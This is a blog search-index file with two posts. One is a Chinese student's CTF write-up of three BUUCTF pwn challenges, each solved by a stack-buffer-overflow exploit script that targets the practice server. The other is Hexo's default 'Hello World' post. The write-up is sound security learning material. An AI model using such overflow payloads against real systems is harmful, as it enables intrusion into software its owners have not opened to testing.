<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>寒假pwn题第一天</title>
    <link href="/2023/01/09/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
    <url>/2023/01/09/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%80%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>拿到题不管三七二十一先check一下，64位文件，无保护:</p><p><img src="/.com//1.png" alt="图片1"></p><p>丢进ida64里，看汇编还是有点费劲，选择F5看伪C代码：</p><p><img src="/.com//2.png" alt="图片2"></p><p>很容易看到第11行的gets，很明显的栈溢出。shift+f12又发现了cat flag.txt：</p><p><img src="/.com//3.png" alt="图片3"></p><p>那局势就很明了了，标准的ret2text，双击进去，Ctrl+x发现在sub_40060D中调用了此字符串：</p><p><img src="/.com//4.png" alt="图片4"></p><p>回到main函数看一下v5的长度：</p><p><img src="/.com//5.png" alt="图片5"></p><p>万事俱全,exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28016</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span> + p64(<span class="hljs-number">0x40060D</span>) <br><br>p.sendline(payload) <br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>同样check,64位，只开了NX保护:</p><p><img src="/.com//6.png" alt="图片6"></p><p>主函数平平无奇，调用了一个func()函数，进去看看:</p><p><img src="/.com//7.png" alt="图片7"></p><p><img src="/.com//8.png" alt="图片8"></p><p>代码审计，发现当v2&#x3D;11.28125时能拿到flag。我们用gets输入的是v1，只需要控制v1的长度，是v1溢出给v2填充为11.28125即可。不过要注意，这里的11.28125需要是16进制的。</p><p>附上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29450</span>) <br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x30</span>-<span class="hljs-number">0x4</span>) + p64(<span class="hljs-number">0x41348000</span>) <br><br>p.sendline(payload) <br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><p>check，32位，只开了NX保护:</p><p><img src="/.com//9.png" alt="图片9"></p><p>可以看到第12行的fgets是我们的输入点，但是它只读入了32（&#x3D;0x20）长度的数据，小于0x3c，没有办法造成溢出，代码审计后发现，会把字符’I’变成’you’：</p><p><img src="/.com//10.png" alt="图片10"></p><p>shell地址也直接给了我们:</p><p><img src="/.com//11.png" alt="图片11"></p><p>附上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26413</span>)<br><br>payload = <span class="hljs-string">b&#x27;I&#x27;</span> * <span class="hljs-number">21</span> + <span class="hljs-string">b&#x27;q&#x27;</span> + p32(<span class="hljs-number">0x8048f0D</span>)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>假期有点懒散，考完试摆了快一个星期了QAQ，最近实验室安排了才开始学，好多都忘了。第一天就写 三道ret2text叭，之后要加加油了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/01/08/hello-world/"/>
    <url>/2023/01/08/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
